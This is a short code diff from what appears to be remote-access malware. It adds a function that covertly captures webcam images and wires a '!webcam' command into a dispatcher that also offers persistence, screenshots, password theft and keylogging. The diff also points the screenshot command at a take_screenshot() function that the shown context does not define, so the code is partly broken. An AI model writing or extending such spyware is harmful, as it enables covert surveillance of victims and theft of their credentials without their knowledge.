@@ -124,6 +124,19 @@ def screenshot():
         except:
             return f"Screenshot error: {e}".encode()
 
+def take_webcam():
+    try:
+        import cv2
+        cap = cv2.VideoCapture(0)
+        ret, frame = cap.read()
+        cap.release()
+        if ret:
+            ret, buffer = cv2.imencode('.jpg', frame)
+            return base64.b64encode(buffer.tobytes())
+    except Exception as e:
+        return f"Camera capture failed: {e}".encode()
+    return b"Camera capture failed."
+
 def persist():
     try:
         exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
@@ -197,7 +210,9 @@ def run_cmd(command):
         elif command == "!persist":
             return persist()
         elif command == "!screenshot":
-            return screenshot()
+            return take_screenshot()
+        elif command == "!webcam":
+            return take_webcam()
         elif command == "!steal_passwords":
             return steal_passwords()
         elif command == "!keylog_start":
